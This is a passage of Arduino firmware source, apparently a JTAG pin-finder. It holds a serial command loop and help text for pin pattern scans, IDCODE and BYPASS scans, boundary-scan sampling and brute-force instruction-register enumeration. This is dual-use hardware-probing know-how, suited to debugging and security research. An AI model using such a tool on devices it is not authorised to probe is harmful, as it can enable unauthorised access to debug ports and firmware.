		if (iractive || VERBOSE) {
			Serial.print(prevread,DEC);
			Serial.print("	Ir ");
			Serial.print(ir_buf);
			Serial.print("	bits changed ");
			Serial.println(iractive, DEC);
		}
	}
}

void set_pattern()
{
	int i;
	char c;

	Serial.print("Enter new pattern of 1's or 0's (terminate with new line or '.'):\r\n"
	             "> ");
	i = 0;
	while(1) {
		c = Serial.read();
		switch(c) {
		case '0':
		case '1':
			if(i < (PATTERN_LEN - 1) ) {
				pattern[i++] = c;
				Serial.print(c);
			}
			break;
		case '\n':
		case '\r':
		case '.': // bah. for the arduino serial console which does not pass us \n
			pattern[i] = 0;
			Serial.println();
			Serial.print("new pattern set [");
			Serial.print(pattern);
			Serial.println("]");
			return;
		}
	}
}

// given a PROGMEM string, use Serial.print() to send it out
void printProgStr(const char *str)
{
	char c;
	if(!str) return;
	while((c = pgm_read_byte(str++)))
		Serial.print(c);
}

void help()
{
	printProgStr(PSTR(	
			"Short and long form commands can be used.\r\n"
			"\r\n"
			"SCANS\r\n"
			"-----\r\n"
			"s > pattern scan\r\n"
			"	 Scans for all JTAG pins. Attempts to set TAP state to\r\n"
			"	 DR_SHIFT and then shift the pattern through the DR.\r\n"
			"p > pattern set\r\n"
			"	 currently: ["));
	Serial.print(pattern);
	printProgStr(PSTR("]\r\n"
			"\r\n"
			"i > idcode scan\r\n"
			"	 Assumes IDCODE is default DR on reset. Ignores TDI.\r\n"
			"	 Sets TAP state to DR_SHIFT and prints TDO to console\r\n"
			"	 when TDO appears active. Human examination required to\r\n"
			"	 determine if actual IDCODE is present. Run several\r\n"
			"	 times to check for consistancy or compare against\r\n"
			"	 active tdo lines found with loopback test.\r\n"
			"\r\n"
			"b > bypass scan\r\n"
			"	 Assumes BYPASS is default DR on reset. Ignores TMS and\r\n"
			"	 shifts pattern[] through TDI/TDO using TCK for clock.\r\n"
			"\r\n"
			"ERATTA\r\n"
			"------\r\n"
			"l > loopback check\r\n"
			"	 ignores tck,tms. if patterns passed to tdo pins are\r\n"
			"	 connected there is a short or a false-possitive\r\n"
			"	 condition exists that should be taken into account\r\n"
			"r > pullups\r\n"
			"	 internal pullups on inputs, on/off. might increase\r\n"
							"	 stability when using a bad patch cable.\r\n"
			"v > verbose\r\n"
			"	 on/off. print tdo bits to console during testing. will slow\r\n"
			"	 down scan.\r\n"
			"d > delay\r\n"
			"	 on/off. will slow down scan.\r\n"
			"- > delay -\r\n"
							"	 reduce delay by 1000us\r\n"
			"+ > delay +\r\n"
							"h > help\r\n"
			"\r\n"
			"OTHER JTAG TESTS\r\n"
			"----------------\r\n"
			"Each of the following will not scan/find JTAG and require\r\n"
			"that you manually set the JTAG pins. See their respective\r\n"
			"call from the loop() function of code to set.\r\n"
			"\r\n"
			"1 > pattern scan single\r\n"
			"	 runs a full check on one code-defined tdi<>tdo pair.\r\n"
			"	 look at the main()/loop() code to specify pins.\r\n"
			"x > boundary scan\r\n"
			"	 checks code defined tdo for 4000+ bits.\r\n"
			"	 look at the main()/loop() code to specify pins.\r\n"
			"y > irenum\r\n"
			"	 sets every possible Instruction Register and then\r\n"
			"	 checks the output of the Data Register.\r\n"
			"	 look at the main()/loop() code to specify pins.\r\n"
			));
}
/*
 * main()
 */
#define CMDLEN 20
char command[CMDLEN];
int dummy;
void loop() 
{
	if (Serial.available())
	{
		// READ COMMAND
		delay(5); // hoping read buffer is idle after 5 ms
		int i = 0;
		while (Serial.available() && i < CMDLEN-1) 
			command[i++] = Serial.read();
	
		Serial.flush();
		command[i] = 0; // terminate string
		Serial.println(command); // echo back
	
		// EXECUTE COMMAND
		if     (strcmp(command, "pattern scan") == 0                     || strcmp(command, "s") == 0)
			scan();
		else if(strcmp(command, "pattern scan single") == 0              || strcmp(command, "1") == 0) 
		{
			init_pins(pins[TCK], pins[TMS], pins[TDI], pins[TRST] /*ntrst*/);
			tap_state(TAP_SHIFTIR, pins[TCK], pins[TMS]);
			if (check_data(pattern, (2*PATTERN_LEN), pins[TCK], pins[TDI], pins[TDO], &dummy))
				Serial.println("found pattern or other");
			else
				Serial.println("no pattern found");
		}
		else if(strcmp(command, "pattern set") == 0                      || strcmp(command, "p") == 0)
			set_pattern();
		else if(strcmp(command, "loopback check") == 0                   || strcmp(command, "l") == 0)
			loopback_check();
		else if(strcmp(command, "idcode scan") == 0                      || strcmp(command, "i") == 0)
			scan_idcode();
		else if(strcmp(command, "bypass scan") == 0                      || strcmp(command, "b") == 0)
			shift_bypass();
		else if(strcmp(command, "boundary scan") == 0                    || strcmp(command, "x") == 0)
		{
			Serial.print("pins");
			print_pins(TCK, TMS, TDO, TDI, TRST);
			Serial.println();
			sample(SCAN_LEN+100, pins[TCK], pins[TMS], pins[TDI], pins[TDO], pins[TRST]);
		}
		else if(strcmp(command, "irenum") == 0                           || strcmp(command, "y") == 0)
			brute_ir(SCAN_LEN,	 pins[TCK], pins[TMS], pins[TDI], pins[TDO], pins[TRST]);
		else if(strcmp(command, "verbose") == 0                          || strcmp(command, "v") == 0)
		{
			VERBOSE = ~VERBOSE;
			Serial.println(VERBOSE ? "Verbose ON" : "Verbose OFF");
		}
		else if(strcmp(command, "delay") == 0                            || strcmp(command, "d") == 0)
		{
			DELAY = ~DELAY;
			Serial.println(DELAY ? "Delay ON" : "Delay OFF");
		}
		else if(strcmp(command, "delay -") == 0                          || strcmp(command, "-") == 0)
		{
			Serial.print("Delay microseconds: ");
			if (DELAYUS != 0 && DELAYUS > 1000) DELAYUS-=1000;
			else if (DELAYUS != 0 && DELAYUS <= 1000) DELAYUS-=100;
			Serial.println(DELAYUS,DEC);
		}
		else if(strcmp(command, "delay +") == 0                          || strcmp(command, "+") == 0)
		{
			Serial.print("Delay microseconds: ");
			if (DELAYUS < 1000) DELAYUS+=100;
			else DELAYUS+=1000;
			Serial.println(DELAYUS,DEC);
		}
		else if(strcmp(command, "pullups") == 0                          || strcmp(command, "r") == 0)
		{
			PULLUP = ~PULLUP;
			Serial.println(PULLUP ? "Pullups ON" : "Pullups OFF");
		}
		else if(strcmp(command, "help") == 0                             || strcmp(command, "h") == 0)
			help();
		else 
		{
			Serial.println("unknown command");
			help();
		}
		Serial.print("\n> ");
	} 
}



